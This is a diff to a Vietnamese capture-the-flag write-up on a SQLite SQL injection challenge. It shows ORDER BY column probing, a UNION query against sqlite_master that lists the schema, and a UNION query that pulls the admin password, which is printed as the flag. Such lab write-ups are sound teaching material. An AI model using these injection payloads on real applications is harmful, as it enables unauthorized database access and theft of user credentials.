@@ -19,7 +19,31 @@ CSDL được sử dụng ở đây là SQLite3 nên ta sẽ khai thác trên SQ
 ### Tìm số cột
 Đầu tiên sử dụng lệnh `ORDER BY` để kiểm tra số cột cho phép.
 
-Nhập lệnh `1’ order by 1--` và đến `1' order by 3--` thì bị lỗi
+Nhập lệnh `1’ order by 1--` và đến `1' order by 3--` thì bị lỗi.
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/37d2dd10-8e0d-48cd-b20b-4f44b58d6530)
+
+Tức là CSDL này có 2 cột. Dùng lệnh `UNION SELCT` để khai thác dữ liệu.
+### Exploit
+Với SQLite3 (https://www.sqlite.org/faq.html), ta sẽ `SELECT` đến `SQLITE_SCHEMA`
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/7c379380-5410-4360-a210-8ae1eacafb85)
+
+Gõ lệnh `1' union select name,sql from sqlite_master--`, ta sẽ biết được CSDL này có 2 bảng là `news` và `users` với lần lượt là tên cột, kiểu dữ liệu.
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/df32cc27-1c25-403a-9444-fa297dadad2f)
+
+`news (CREATE TABLE news(id INTEGER, title TEXT, description TEXT))`
+
+`users (CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))`
+
+Đề bài yêu cầu tìm password admin nên ta cần truy xuất dữ liệu từ bảng `users`. Thực thi câu lệnh  `1' union select username, password from users --`, ta sẽ tìm được password của admin: `admin (c4K04dtIaJsuWdi)`
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/c1ae054f-3d4b-4b73-ad7c-8784c82412cd)
+
+## Flag
+`c4K04dtIaJsuWdi`
+
 
 
 
